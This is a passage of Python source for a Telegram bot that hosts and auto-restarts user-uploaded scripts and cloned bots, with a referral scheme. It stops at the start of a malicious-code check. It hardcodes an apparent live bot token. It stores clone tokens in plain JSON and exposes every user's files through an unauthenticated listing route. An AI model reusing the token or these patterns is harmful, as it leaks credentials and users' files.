# -*- coding: utf-8 -*-
"""
By @mutluapk
Universal File Hosting Bot - ULTIMATE PERSISTENT VERSION
+ REFERRAL SYSTEM - 2 referrals = 1 hosting slot
+ OWNER APPROVAL REQUIRED FOR EXECUTION
"""

import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
from telebot import types
import time
from datetime import datetime, timedelta
import psutil
import sqlite3
import json
import logging
import signal
import threading
import re
import sys
import atexit
import requests
import ast
from pathlib import Path
import hashlib
import base64
import random
import string

# --- Flask Keep Alive ---
from flask import Flask, render_template, jsonify, request, send_file
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return """
    <html>
    <head><title>Universal File Host</title></head>
    <body style="font-family: Arial; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 50px;">
        <h1>File Host By @doxbinyetkili</h1>
        <h2>100% Data Protection - No Loss Ever</h2>
        <p>📁 30+ file types with secure hosting</p>
        <p>🚀 Auto-restart all scripts & clones</p>
        <p>🛡️ Advanced persistent data system</p>
        <p>💾 Never lose files or users</p>
        <p>✅ Owner Approval System for Execution</p>
        <p>👥 Referral System: 2 referrals = 1 hosting slot</p>
    </body>
    </html>
    """

@app.route('/file/<file_hash>')
def serve_file(file_hash):
    """Serve hosted files by hash"""
    try:
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                expected_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                if expected_hash == file_hash:
                    file_path = os.path.join(get_user_folder(user_id), file_name)
                    if os.path.exists(file_path):
                        return send_file(file_path, as_attachment=False)
        return "File not found", 404
    except Exception as e:
        logger.error(f"Error serving file {file_hash}: {e}")
        return "Error serving file", 500

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/files')
def list_files():
    """List all hosted files (for debugging)"""
    try:
        files_list = []
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                if file_type == 'hosted':
                    file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                    files_list.append({
                        'name': file_name,
                        'user_id': user_id,
                        'hash': file_hash,
                        'url': f"/file/{file_hash}"
                    })
        return jsonify({"files": files_list})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask Keep-Alive server started.")

# --- Configuration ---
TOKEN = '8668348358:AAF1T_Mqo8ZKJguRAoNSESndB8EGqcyxVFs'
OWNER_ID =7250471858
ADMIN_ID =7250471858
YOUR_USERNAME = os.getenv('BOT_USERNAME', '@lunasloury')
UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/glearya')
LOG_CHANNEL = "-1003827548507"

# Enhanced folder setup
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_BOTS_DIR = os.path.join(BASE_DIR, 'upload_bots')
IROTECH_DIR = os.path.join(BASE_DIR, 'inf')
DATABASE_PATH = os.path.join(IROTECH_DIR, 'bot_data.db')
LOGS_DIR = os.path.join(BASE_DIR, 'execution_logs')
BACKUP_DIR = os.path.join(BASE_DIR, 'backups')
PERSISTENT_DATA_FILE = os.path.join(IROTECH_DIR, 'persistent_data.json')
AUTO_RESTART_FILE = os.path.join(IROTECH_DIR, 'auto_restart.json')
PENDING_APPROVAL_DIR = os.path.join(BASE_DIR, 'pending_approval')
PENDING_EXECUTION_DIR = os.path.join(BASE_DIR, 'pending_execution')  # New: For execution approvals

# File upload limits
FREE_USER_LIMIT = 9
SUBSCRIBED_USER_LIMIT = 5
ADMIN_LIMIT = 9999
OWNER_LIMIT = float('inf')

# Referral system constants
REFERRALS_PER_SLOT = 2  # 2 referrals = 1 extra slot
MAX_REFERRAL_SLOTS = 10  # Maximum extra slots from referrals

# Create necessary directories
for directory in [UPLOAD_BOTS_DIR, IROTECH_DIR, LOGS_DIR, BACKUP_DIR, PENDING_APPROVAL_DIR, PENDING_EXECUTION_DIR]:
    os.makedirs(directory, exist_ok=True)

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# --- Data structures ---
bot_scripts = {}
user_subscriptions = {}
user_files = {}
active_users = set()
admin_ids = {ADMIN_ID, OWNER_ID}
banned_users = set()
bot_locked = False
broadcast_mode = {}
clone_requests = {}
user_clones = {}
pending_approvals = {}  # For file upload approvals
pending_executions = {}  # New: For file execution approvals

# --- NEW: Referral System Data ---
user_referrals = {}  # user_id -> list of referred user_ids
user_referral_codes = {}  # user_id -> unique referral code
referral_stats = {}  # user_id -> {'total': x, 'successful': y, 'slots_earned': z}

# --- Command Button Layouts ---
COMMAND_BUTTONS_LAYOUT_USER_SPEC = [
    ["📢 Updates Channel"],
    ["📤 Upload File", "📂 Check Files"],
    ["👥 Referral System", "📊 Statistics"],
    ["⚡ Bot Speed", "📞 Contact Owner"]
]

ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC = [
    ["📢 Updates Channel"],
    ["📤 Upload File", "📂 Check Files"],
    ["👥 Referral System", "📊 Statistics"],
    ["⚡ Bot Speed", "📞 Contact Owner"],
    ["💳 Subscriptions", "📢 Broadcast"],
    ["🔒 Lock Bot", "🟢 Running All Code"],
    ["👑 Admin Panel", "🤖 Clone Bot"]
]

# --- Ultimate Persistent Data Management ---
def save_persistent_data():
    """Save ALL data to persistent JSON file - ULTIMATE VERSION"""
    try:
        persistent_data = {
            'active_users': list(active_users),
            'user_files': {str(k): v for k, v in user_files.items()},
            'user_subscriptions': {
                str(k): {
                    'expiry': v['expiry'].isoformat() if isinstance(v['expiry'], datetime) else v['expiry']
                } for k, v in user_subscriptions.items()
            },
            'admin_ids': list(admin_ids),
            'banned_users': list(banned_users),
            'bot_locked': bot_locked,
            'bot_scripts': {
                k: {
                    'user_id': v['user_id'],
                    'file_name': v['file_name'],
                    'start_time': v['start_time'].isoformat(),
                    'language': v.get('language', 'Unknown'),
                    'icon': v.get('icon', '📄'),
                    'file_path': os.path.join(get_user_folder(v['user_id']), v['file_name'])
                } for k, v in bot_scripts.items()
            },
            'user_clones': {
                str(k): {
                    'bot_username': v['bot_username'],
                    'clone_dir': v['clone_dir'],
                    'start_time': v['start_time'].isoformat(),
                    'token': get_clone_token(k)
                } for k, v in user_clones.items()
            },
            'pending_approvals': {k: {
                'user_id': v['user_id'],
                'file_name': v['file_name'],
                'file_path': v['file_path'],
                'security_issue': v['security_issue'],
                'upload_time': v['upload_time'].isoformat() if isinstance(v['upload_time'], datetime) else v['upload_time'],
                'user_info': v['user_info']
            } for k, v in pending_approvals.items()},
            'pending_executions': {k: {
                'user_id': v['user_id'],
                'file_name': v['file_name'],
                'file_path': v['file_path'],
                'request_time': v['request_time'].isoformat() if isinstance(v['request_time'], datetime) else v['request_time'],
                'user_info': v['user_info']
            } for k, v in pending_executions.items()},
            # New referral data
            'user_referrals': {str(k): v for k, v in user_referrals.items()},
            'user_referral_codes': {str(k): v for k, v in user_referral_codes.items()},
            'referral_stats': {str(k): v for k, v in referral_stats.items()},
            'last_save': datetime.now().isoformat(),
            'save_count': get_save_count() + 1
        }

        # Create backup of previous data
        if os.path.exists(PERSISTENT_DATA_FILE):
            backup_file = PERSISTENT_DATA_FILE + '.backup'
            shutil.copy2(PERSISTENT_DATA_FILE, backup_file)

        with open(PERSISTENT_DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(persistent_data, f, indent=2, ensure_ascii=False)

        # Also save to auto_restart file
        save_auto_restart_data()

        logger.info("✅ Ultimate persistent data saved successfully")
        return True
    except Exception as e:
        logger.error(f"❌ Error saving persistent data: {e}")
        return False

def load_persistent_data():
    """Load ALL data from persistent JSON file - ULTIMATE VERSION"""
    global active_users, user_files, user_subscriptions, admin_ids, banned_users, bot_locked
    global pending_approvals, pending_executions, user_referrals, user_referral_codes, referral_stats

    if not os.path.exists(PERSISTENT_DATA_FILE):
        logger.info("No persistent data file found, starting fresh")
        return False

    try:
        with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
            persistent_data = json.load(f)

        # Load basic data
        active_users = set(persistent_data.get('active_users', []))
        admin_ids = set(persistent_data.get('admin_ids', [ADMIN_ID, OWNER_ID]))
        banned_users = set(persistent_data.get('banned_users', []))
        bot_locked = persistent_data.get('bot_locked', False)

        # Load user files
        user_files = {}
        for user_id_str, files in persistent_data.get('user_files', {}).items():
            user_files[int(user_id_str)] = files

        # Load user subscriptions
        user_subscriptions = {}
        for user_id_str, sub_data in persistent_data.get('user_subscriptions', {}).items():
            try:
                user_subscriptions[int(user_id_str)] = {
                    'expiry': datetime.fromisoformat(sub_data['expiry'])
                }
            except (ValueError, KeyError):
                continue

        # Load pending approvals
        pending_approvals = {}
        for approval_id, approval_data in persistent_data.get('pending_approvals', {}).items():
            try:
                pending_approvals[approval_id] = {
                    'user_id': approval_data['user_id'],
                    'file_name': approval_data['file_name'],
                    'file_path': approval_data['file_path'],
                    'security_issue': approval_data['security_issue'],
                    'upload_time': datetime.fromisoformat(approval_data['upload_time']),
                    'user_info': approval_data['user_info']
                }
            except (ValueError, KeyError):
                continue

        # Load pending executions
        pending_executions = {}
        for exec_id, exec_data in persistent_data.get('pending_executions', {}).items():
            try:
                pending_executions[exec_id] = {
                    'user_id': exec_data['user_id'],
                    'file_name': exec_data['file_name'],
                    'file_path': exec_data['file_path'],
                    'request_time': datetime.fromisoformat(exec_data['request_time']),
                    'user_info': exec_data['user_info']
                }
            except (ValueError, KeyError):
                continue

        # Load referral data
        user_referrals = {}
        for user_id_str, referrals in persistent_data.get('user_referrals', {}).items():
            user_referrals[int(user_id_str)] = referrals

        user_referral_codes = {}
        for user_id_str, code in persistent_data.get('user_referral_codes', {}).items():
            user_referral_codes[int(user_id_str)] = code

        referral_stats = {}
        for user_id_str, stats in persistent_data.get('referral_stats', {}).items():
            referral_stats[int(user_id_str)] = stats

        logger.info(f"✅ Persistent data loaded: {len(active_users)} users, {len(user_files)} file records, {len(pending_approvals)} pending approvals, {len(pending_executions)} pending executions")
        return True
    except Exception as e:
        logger.error(f"❌ Error loading persistent data: {e}")
        return False

def save_auto_restart_data():
    """Save auto-restart specific data"""
    try:
        auto_restart_data = {
            'running_scripts': [],
            'user_clones': [],
            'last_update': datetime.now().isoformat()
        }

        # Save running scripts info
        for script_key, script_info in bot_scripts.items():
            auto_restart_data['running_scripts'].append({
                'user_id': script_info['user_id'],
                'file_name': script_info['file_name'],
                'file_path': os.path.join(get_user_folder(script_info['user_id']), script_info['file_name']),
                'start_time': script_info['start_time'].isoformat()
            })

        # Save clone info
        for user_id, clone_info in user_clones.items():
            auto_restart_data['user_clones'].append({
                'user_id': user_id,
                'bot_username': clone_info['bot_username'],
                'token': get_clone_token(user_id)
            })

        with open(AUTO_RESTART_FILE, 'w', encoding='utf-8') as f:
            json.dump(auto_restart_data, f, indent=2, ensure_ascii=False)

        logger.info("✅ Auto-restart data saved")
        return True
    except Exception as e:
        logger.error(f"❌ Error saving auto-restart data: {e}")
        return False

def get_clone_token(user_id):
    """Get clone token from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT token FROM clone_bots WHERE user_id = ?', (user_id,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else None
    except:
        return None

def get_save_count():
    """Get save count from persistent data"""
    try:
        if os.path.exists(PERSISTENT_DATA_FILE):
            with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return data.get('save_count', 0)
        return 0
    except:
        return 0

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, 'bot.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Database Functions ---
def init_db():
    """Initialize the database with enhanced tables"""
    logger.info(f"Initializing database at: {DATABASE_PATH}")
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Create tables
        c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                     (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_files
                     (user_id INTEGER, file_name TEXT, file_type TEXT, upload_time TEXT,
                      PRIMARY KEY (user_id, file_name))''')
        c.execute('''CREATE TABLE IF NOT EXISTS active_users
                     (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, join_date TEXT, last_seen TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS admins
                     (user_id INTEGER PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS running_scripts
                     (user_id INTEGER, file_name TEXT, start_time TEXT, pid INTEGER,
                      PRIMARY KEY (user_id, file_name))''')
        c.execute('''CREATE TABLE IF NOT EXISTS banned_users
                     (user_id INTEGER PRIMARY KEY, reason TEXT, ban_date TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS clone_bots
                     (user_id INTEGER, bot_username TEXT, token TEXT, create_time TEXT,
                      PRIMARY KEY (user_id, bot_username))''')

        # New referral tables
        c.execute('''CREATE TABLE IF NOT EXISTS referral_codes
                     (user_id INTEGER PRIMARY KEY, referral_code TEXT UNIQUE, created_at TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals
                     (referrer_id INTEGER, referred_id INTEGER, referral_date TEXT,
                      status TEXT DEFAULT 'pending', PRIMARY KEY (referrer_id, referred_id))''')
        c.execute('''CREATE TABLE IF NOT EXISTS referral_stats
                     (user_id INTEGER PRIMARY KEY, total_referrals INTEGER DEFAULT 0,
                      successful_referrals INTEGER DEFAULT 0, slots_earned INTEGER DEFAULT 0)''')

        # Ensure admins
        c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
        if ADMIN_ID != OWNER_ID:
            c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (ADMIN_ID,))

        conn.commit()
        conn.close()
        logger.info("Database initialized successfully.")
    except Exception as e:
        logger.error(f"Database initialization error: {e}")

def load_data():
    """Load data from database into memory and sync with persistent data"""
    logger.info("Loading data from database...")

    # First load persistent data for immediate recovery
    load_persistent_data()

    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Load subscriptions
        c.execute('SELECT user_id, expiry FROM subscriptions')
        for user_id, expiry in c.fetchall():
            try:
                user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
            except ValueError:
                logger.warning(f"Invalid expiry date for user {user_id}")

        # Load user files - merge with persistent data
        c.execute('SELECT user_id, file_name, file_type FROM user_files')
        db_user_files = {}
        for user_id, file_name, file_type in c.fetchall():
            if user_id not in db_user_files:
                db_user_files[user_id] = []
            db_user_files[user_id].append((file_name, file_type))

        # Update user_files with database data (prioritize database)
        for user_id, files in db_user_files.items():
            user_files[user_id] = files

        # Load active users - merge with persistent data
        c.execute('SELECT user_id FROM active_users')
        db_active_users = set(user_id for (user_id,) in c.fetchall())
        active_users.update(db_active_users)  # Merge both sources

        # Load admins
        c.execute('SELECT user_id FROM admins')
        admin_ids.update(user_id for (user_id,) in c.fetchall())

        # Load banned users
        c.execute('SELECT user_id FROM banned_users')
        banned_users.update(user_id for (user_id,) in c.fetchall())

        # Load referral codes
        c.execute('SELECT user_id, referral_code FROM referral_codes')
        for user_id, code in c.fetchall():
            user_referral_codes[user_id] = code

        # Load referral stats
        c.execute('SELECT user_id, total_referrals, successful_referrals, slots_earned FROM referral_stats')
        for user_id, total, successful, slots in c.fetchall():
            referral_stats[user_id] = {
                'total': total,
                'successful': successful,
                'slots_earned': slots
            }

        # Load referrals
        c.execute('SELECT referrer_id, referred_id FROM referrals WHERE status = "successful"')
        for referrer_id, referred_id in c.fetchall():
            if referrer_id not in user_referrals:
                user_referrals[referrer_id] = []
            user_referrals[referrer_id].append(referred_id)

        conn.close()
        logger.info(f"Data loaded: {len(active_users)} users, {len(user_files)} file records, {len(banned_users)} banned users")

        # Now auto-restart everything
        auto_restart_scripts_and_clones()

    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_running_script(user_id, file_name, pid=None):
    """Save running script to database for auto-restart"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO running_scripts (user_id, file_name, start_time, pid) VALUES (?, ?, ?, ?)',
                 (user_id, file_name, datetime.now().isoformat(), pid))
        conn.commit()
        conn.close()
        save_persistent_data()  # Immediate save
    except Exception as e:
        logger.error(f"Error saving running script: {e}")

def remove_running_script(user_id, file_name):
    """Remove running script from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('DELETE FROM running_scripts WHERE user_id = ? AND file_name = ?', (user_id, file_name))
        conn.commit()
        conn.close()
        save_persistent_data()  # Immediate save
    except Exception as e:
        logger.error(f"Error removing running script: {e}")

def save_user_info(user_id, username, first_name, last_name):
    """Save user information to database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO active_users (user_id, username, first_name, last_name, join_date, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
                 (user_id, username, first_name, last_name, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        conn.close()

        # Also update persistent data
        active_users.add(user_id)
        save_persistent_data()
    except Exception as e:
        logger.error(f"Error saving user info: {e}")

def update_user_last_seen(user_id):
    """Update user's last seen timestamp"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE active_users SET last_seen = ? WHERE user_id = ?',
                 (datetime.now().isoformat(), user_id))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error updating last seen: {e}")

def save_clone_info(user_id, bot_username, token):
    """Save clone bot information to database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO clone_bots (user_id, bot_username, token, create_time) VALUES (?, ?, ?, ?)',
                 (user_id, bot_username, token, datetime.now().isoformat()))
        conn.commit()
        conn.close()

        # Also update persistent data
        save_persistent_data()
    except Exception as e:
        logger.error(f"Error saving clone info: {e}")

def remove_clone_info(user_id):
    """Remove clone bot information from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('DELETE FROM clone_bots WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()

        # Also update persistent data
        save_persistent_data()
    except Exception as e:
        logger.error(f"Error removing clone info: {e}")

# --- Helper Functions ---
def get_user_folder(user_id):
    """Get or create user's folder for storing files"""
    user_folder = os.path.join(UPLOAD_BOTS_DIR, str(user_id))
    os.makedirs(user_folder, exist_ok=True)
    return user_folder

def get_user_file_limit(user_id):
    """Get the file upload limit for a user (base + referral slots)"""
    if user_id == OWNER_ID:
        return OWNER_LIMIT
    if user_id in admin_ids:
        return ADMIN_LIMIT
    if user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now():
        return SUBSCRIBED_USER_LIMIT

    # Base limit + referral slots
    base_limit = FREE_USER_LIMIT
    referral_slots = get_referral_slots_earned(user_id)
    return base_limit + referral_slots

def get_referral_slots_earned(user_id):
    """Get number of extra slots earned from referrals"""
    stats = referral_stats.get(user_id, {'slots_earned': 0})
    return min(stats['slots_earned'], MAX_REFERRAL_SLOTS)

def get_user_file_count(user_id):
    """Get the number of files uploaded by a user"""
    return len(user_files.get(user_id, []))

def is_bot_running(script_owner_id, file_name):
    """Check if a bot script is currently running"""
    script_key = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if script_info and script_info.get('process'):
        try:
            proc = psutil.Process(script_info['process'].pid)
            is_running = proc.is_running() and proc.status() != psutil.STATUS_ZOMBIE
            if not is_running:
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
            return is_running
        except psutil.NoSuchProcess:
            if script_key in bot_scripts:
                del bot_scripts[script_key]
            return False
        except Exception:
            return False
    return False

def get_script_uptime(script_owner_id, file_name):
    """Get the uptime of a running script"""
    script_key = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if script_info and script_info.get('start_time'):
        uptime = datetime.now() - script_info['start_time']
        return str(uptime).split('.')[0]  # Remove microseconds
    return None

def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
    """Safely send message with fallback for parse errors"""
    try:
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Send without parse_mode if there's a parsing error
            return bot.send_message(chat_id, text, reply_markup=reply_markup)
        else:
            raise e

def safe_edit_message(chat_id, message_id, text, parse_mode=None, reply_markup=None):
    """Safely edit message with fallback for parse errors"""
    try:
        return bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Edit without parse_mode if there's a parsing error
            return bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup)
        else:
            raise e

def safe_reply_to(message, text, parse_mode=None, reply_markup=None):
    """Safely reply to message with fallback for parse errors"""
    try:
        return bot.reply_to(message, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Reply without parse_mode if there's a parsing error
            return bot.reply_to(message, text, reply_markup=reply_markup)
        else:
            raise e

def send_to_log_channel(message, document=None):
    """Send message to log channel with optional file"""
    try:
        if document:
            bot.send_document(LOG_CHANNEL, document, caption=message)
        else:
            bot.send_message(LOG_CHANNEL, message)
    except Exception as e:
        logger.error(f"Failed to send message to log channel: {e}")

def create_backup():
    """Create backup of important data"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = os.path.join(BACKUP_DIR, f"backup_{timestamp}.db")
        shutil.copy2(DATABASE_PATH, backup_file)

        # Also backup persistent data
        persistent_backup = os.path.join(BACKUP_DIR, f"persistent_{timestamp}.json")
        if os.path.exists(PERSISTENT_DATA_FILE):
            shutil.copy2(PERSISTENT_DATA_FILE, persistent_backup)

        # Keep only last 10 backups
        backups = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith('backup_')])
        if len(backups) > 10:
            for old_backup in backups[:-10]:
                os.remove(os.path.join(BACKUP_DIR, old_backup))

        logger.info(f"Backup created: {backup_file}")
    except Exception as e:
        logger.error(f"Backup creation failed: {e}")

# --- NEW: Referral System Functions ---
def generate_referral_code(user_id):
    """Generate a unique referral code for a user"""
    if user_id in user_referral_codes:
        return user_referral_codes[user_id]

    # Generate unique code
    while True:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        # Check if code already exists
        if code not in user_referral_codes.values():
            user_referral_codes[user_id] = code

            # Save to database
            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('INSERT OR REPLACE INTO referral_codes (user_id, referral_code, created_at) VALUES (?, ?, ?)',
                         (user_id, code, datetime.now().isoformat()))
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"Error saving referral code: {e}")

            save_persistent_data()
            return code

def process_referral(referred_user_id, referrer_code):
    """Process a referral when new user joins with code"""
    # Find referrer by code
    referrer_id = None
    for uid, code in user_referral_codes.items():
        if code == referrer_code:
            referrer_id = uid
            break

    if not referrer_id or referrer_id == referred_user_id:
        return False, "Invalid referral code"

    # Check if already referred
    if referrer_id in user_referrals and referred_user_id in user_referrals[referrer_id]:
        return False, "Already referred"

    # Add referral
    if referrer_id not in user_referrals:
        user_referrals[referrer_id] = []
    user_referrals[referrer_id].append(referred_user_id)

    # Update stats
    if referrer_id not in referral_stats:
        referral_stats[referrer_id] = {'total': 0, 'successful': 0, 'slots_earned': 0}

    referral_stats[referrer_id]['total'] += 1

    # Check if should award slot (every REFERRALS_PER_SLOT successful referrals)
    successful_count = referral_stats[referrer_id]['successful']
    new_slots = (successful_count + 1) // REFERRALS_PER_SLOT
    current_slots = referral_stats[referrer_id]['slots_earned']

    if new_slots > current_slots:
        referral_stats[referrer_id]['slots_earned'] = new_slots

    referral_stats[referrer_id]['successful'] += 1

    # Save to database
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO referrals (referrer_id, referred_id, referral_date, status) VALUES (?, ?, ?, ?)',
                 (referrer_id, referred_user_id, datetime.now().isoformat(), 'successful'))
        c.execute('INSERT OR REPLACE INTO referral_stats (user_id, total_referrals, successful_referrals, slots_earned) VALUES (?, ?, ?, ?)',
                 (referrer_id, referral_stats[referrer_id]['total'], referral_stats[referrer_id]['successful'], referral_stats[referrer_id]['slots_earned']))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving referral: {e}")

    save_persistent_data()

    # Notify referrer
    try:
        new_limit = get_user_file_limit(referrer_id)
        notification = f"🎉 Yeni bir kullanıcı sizin referans kodunuzla kayıt oldu!\n\n"
        notification += f"👤 Yeni kullanıcı ID: {referred_user_id}\n"
        notification += f"📊 Toplam referansınız: {referral_stats[referrer_id]['successful']}\n"
        notification += f"📁 Kazandığınız slot sayısı: {referral_stats[referrer_id]['slots_earned']}\n"
        notification += f"📈 Yeni dosya limitiniz: {new_limit}\n\n"
        notification += f"Her {REFERRALS_PER_SLOT} referansta 1 ekstra slot kazanıyorsunuz!"

        bot.send_message(referrer_id, notification)
    except:
        pass

    return True, f"Referral successful! You've been referred by user {referrer_id}"

def get_referral_info(user_id):
    """Get referral information for a user"""
    stats = referral_stats.get(user_id, {'total': 0, 'successful': 0, 'slots_earned': 0})
    code = generate_referral_code(user_id)

    info = f"👥 **Referans Sistemi**\n\n"
    info += f"🔗 **Referans Kodunuz:** `{code}`\n"
    info += f"📊 **İstatistikleriniz:**\n"
    info += f"• Toplam Referans: {stats['total']}\n"
    info += f"• Başarılı Referans: {stats['successful']}\n"
    info += f"• Kazanılan Slot: {stats['slots_earned']}\n\n"
    info += f"📁 **Dosya Limitiniz:** {get_user_file_limit(user_id)}\n"
    info += f"• Temel Limit: {FREE_USER_LIMIT}\n"
    info += f"• Referans Slotları: +{stats['slots_earned']}\n\n"
    info += f"🎯 **Nasıl Çalışır?**\n"
    info += f"Her {REFERRALS_PER_SLOT} başarılı referansta 1 ekstra dosya yükleme slotu kazanırsınız!\n"
    info += f"Maksimum {MAX_REFERRAL_SLOTS} ekstra slot kazanabilirsiniz.\n\n"
    info += f"📤 **Referans Linkiniz:**\n"
    info += f"`https://t.me/{bot.get_me().username}?start=ref_{code}`"

    return info

# --- Ultimate Auto-Restart System ---
def auto_restart_scripts_and_clones():
    """ULTIMATE AUTO-RESTART - Restart everything after bot reboot"""
    logger.info("🚀 Starting ULTIMATE auto-restart process...")

    restart_count = 0
    clone_restart_count = 0

    try:
        # Method 1: Restart from database (most reliable)
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Restart scripts from database
        c.execute('SELECT user_id, file_name FROM running_scripts')
        for user_id, file_name in c.fetchall():
            user_folder = get_user_folder(user_id)
            file_path = os.path.join(user_folder, file_name)

            if os.path.exists(file_path):
                logger.info(f"🔄 Auto-restarting script: {file_name} for user {user_id}")
                success, result = execute_script(user_id, file_path)
                if success:
                    restart_count += 1
                    logger.info(f"✅ Successfully auto-restarted: {file_name}")
                    try:
                        bot.send_message(user_id, f"🔄 Your script '{file_name}' has been automatically restarted after bot reboot!")
                    except:
                        pass
                else:
                    logger.error(f"❌ Failed to auto-restart {file_name}: {result}")
            else:
                logger.warning(f"⚠️ File not found, removing from running: {file_name}")
                remove_running_script(user_id, file_name)

        # Restart clone bots from database
        c.execute('SELECT user_id, bot_username, token FROM clone_bots')
        for user_id, bot_username, token in c.fetchall():
            logger.info(f"🔄 Auto-restarting clone bot for user {user_id}: @{bot_username}")
            clone_success = create_bot_clone(user_id, token, bot_username)
            if clone_success:
                clone_restart_count += 1
                logger.info(f"✅ Successfully auto-restarted clone bot: @{bot_username}")
            else:
                logger.error(f"❌ Failed to auto-restart clone bot: @{bot_username}")

        conn.close()

        # Method 2: Restart from persistent data (backup method)
        if restart_count == 0 and os.path.exists(PERSISTENT_DATA_FILE):
            logger.info("🔄 Trying backup restart from persistent data...")
            with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
                persistent_data = json.load(f)

            bot_scripts_data = persistent_data.get('bot_scripts', {})
            for script_key, script_info in bot_scripts_data.items():
                user_id = script_info['user_id']
                file_name = script_info['file_name']
                file_path = os.path.join(get_user_folder(user_id), file_name)

                if os.path.exists(file_path) and not is_bot_running(user_id, file_name):
                    logger.info(f"🔄 Backup restarting script: {file_name}")
                    success, result = execute_script(user_id, file_path)
                    if success:
                        restart_count += 1

        logger.info(f"🎉 Auto-restart completed: {restart_count} scripts, {clone_restart_count} clones")

        # Send restart report to log channel
        try:
            restart_report = f"🔄 ULTIMATE AUTO-RESTART REPORT\n\n"
            restart_report += f"✅ Scripts restarted: {restart_count}\n"
            restart_report += f"✅ Clones restarted: {clone_restart_count}\n"
            restart_report += f"👥 Active users: {len(active_users)}\n"
            restart_report += f"📁 Total files: {sum(len(files) for files in user_files.values())}\n"
            restart_report += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            send_to_log_channel(restart_report)
        except:
            pass

    except Exception as e:
        logger.error(f"❌ Error in auto-restart: {e}")

# --- Enhanced Security Checks ---
def check_malicious_code(file_path):
